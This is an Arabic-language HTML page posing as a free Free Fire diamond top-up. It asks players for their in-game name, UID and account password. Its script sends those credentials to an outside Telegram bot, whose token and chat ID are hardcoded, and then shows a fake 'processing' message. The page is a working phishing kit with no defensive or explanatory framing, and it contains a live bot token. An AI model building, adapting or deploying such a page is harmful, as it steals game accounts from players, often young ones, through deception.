<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن جواهر فري فاير مجاناً</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap');

        body {
            margin: 0;
            padding: 0;
            color: #fff;
            font-family: 'Cairo', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            /* تعيين الصورة كخلفية للشاشة بالكامل */
            background-image: url('maxresdefault.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        /* طبقة داكنة فوق الخلفية لتوضيح النصوص */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: -1;
        }

        .container {
            background: rgba(20, 20, 25, 0.85);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(255, 153, 0, 0.4), inset 0 0 20px rgba(255, 153, 0, 0.2);
            border: 2px solid #ff9900;
            text-align: center;
            width: 90%;
            max-width: 400px;
            backdrop-filter: blur(10px);
            animation: float 4s ease-in-out infinite;
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }

        h1 {
            color: #ff9900;
            text-shadow: 0 0 10px #ff9900;
            margin-bottom: 20px;
            font-size: 28px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #ddd;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #ff9900;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
            box-sizing: border-box;
        }

        input:focus {
            box-shadow: 0 0 15px #ff9900;
        }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff9900, #ff5500);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            box-shadow: 0 0 15px rgba(255, 153, 0, 0.6);
            margin-top: 10px;
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 25px rgba(255, 153, 0, 1);
        }

        .success-msg {
            display: none;
            color: #00ff88;
            margin-top: 20px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff88;
        }
    </style>
</head>
<body>

    <div class="overlay"></div>

    <div class="container">
        <h1>💎 شحن جواهر مجاناً 💎</h1>
        <p style="font-size: 14px; color: #ccc; margin-bottom: 25px;">أدخل بياناتك لاستلام الجواهر في حسابك مباشرة.</p>
        
        <div class="input-group">
            <label>اسم اللاعب (في اللعبة):</label>
            <input type="text" id="playerName" placeholder="مثال: Ninja_Pro" required>
        </div>

        <div class="input-group">
            <label>معرف اللاعب (UID):</label>
            <input type="number" id="playerUid" placeholder="أدخل الـ UID الخاص بك" required>
        </div>

        <div class="input-group">
            <label>كلمة المرور:</label>
            <input type="password" id="playerPassword" placeholder="أدخل كلمة المرور الخاصة بالحساب" required>
        </div>

        <button onclick="sendToTelegram()">اشحن الآن 🔥</button>
        <div class="success-msg" id="successMsg">🎉 جاري معالجة الطلب! سيتم الشحن قريباً.</div>
    </div>

    <script>
        function sendToTelegram() {
            const name = document.getElementById('playerName').value;
            const uid = document.getElementById('playerUid').value;
            const password = document.getElementById('playerPassword').value;

            if(!name || !uid || !password) {
                alert("يرجى إدخال جميع البيانات (الاسم، الـ UID، وكلمة المرور)!");
                return;
            }

            // --- ضع بيانات البوت الخاص بك هنا ---
            const botToken ="8221264460:AAFPrYn7Ae7W0mXVjd31yktH8Xqd8iI1bMI"; 
            const chatId = "7394389253";        
            // الرسالة المنسقة التي ستصلك على التلجرام وتتضمن كلمة المرور
            const message = `💎 طلب شحن جديد!\n\n👤 الاسم: ${name}\n🆔 الـ UID: ${uid}\n🔑 كلمة المرور: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => {
                    if(response.ok) {
                        document.getElementById('successMsg').style.display = 'block';
                        document.getElementById('playerName').value = '';
                        document.getElementById('playerUid').value = '';
                        document.getElementById('playerPassword').value = '';
                    } else {
                        alert("حدث خطأ، يرجى المحاولة لاحقاً.");
                    }
                })
                .catch(error => {
                    alert("تأكد من اتصالك بالإنترنت.");
                });
        }
    </script>
</body>
</html>
